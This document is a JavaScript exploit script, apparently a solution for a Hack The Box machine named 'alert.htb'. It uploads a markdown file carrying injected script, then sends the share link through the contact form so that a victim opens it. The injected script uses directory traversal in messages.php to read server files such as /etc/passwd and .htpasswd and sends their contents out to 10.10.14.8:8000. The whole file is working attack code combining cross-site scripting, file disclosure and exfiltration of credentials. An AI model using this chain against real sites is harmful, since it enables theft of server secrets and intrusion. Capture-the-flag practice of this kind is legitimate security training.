
// The file content, as a string.
const fileContent = `<script>
let f = async () => {
    // let a = await fetch('http://alert.htb/messages.php')
    //let a = await fetch('http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt')
    //let a = await fetch('http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/htpass/.htpasswd')
     //let a = await fetch('http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/.htpasswd')
     //let a = await fetch('http://alert.htb/messages.php?file=../../../../../../../../etc/passwd')
     // let a = await fetch('http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/httpd.conf')
     // let a = await fetch('http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/apache2.conf')
     // let a = await fetch('http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/sites-available/000-default.conf')
     let a = await fetch('http://alert.htb/messages.php?file=../../../../../../../../var/www/statistics.alert.htb/.htpasswd')
        .then(response => response.text())
        .then(r => {
            console.log(r);
            let image = new Image();
            image.src="http://10.10.14.8:8000/?c="+encodeURIComponent(r)
        })
}
a = f()
</script>`

const URL = 'http://alert.htb'


let formdata = new FormData();
let blob = new Blob([fileContent], {type: "text/markdown"})
formdata.append("file", blob, "file.md");

let exfil = async () => {
    return fetch(URL + "/visualizer.php", {
        method:'POST',
        body: formdata,
    })
        .then(response => {
            return response.text()
        })
        .then(data => {
            md_file = data.split("script")[2].split("share=")[1].split("\" target")[0]
            const to_send = new URLSearchParams();
            to_send.append('email', 'abc@gmail.com')
            to_send.append('message', URL + "/visualizer.php?link_share=" + md_file)
            return fetch(URL + "/contact.php", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: to_send.toString()
            })
        })
        .then(response => response.text())
        .then(data => console.log(decodeURIComponent(data)))
}
exfil()
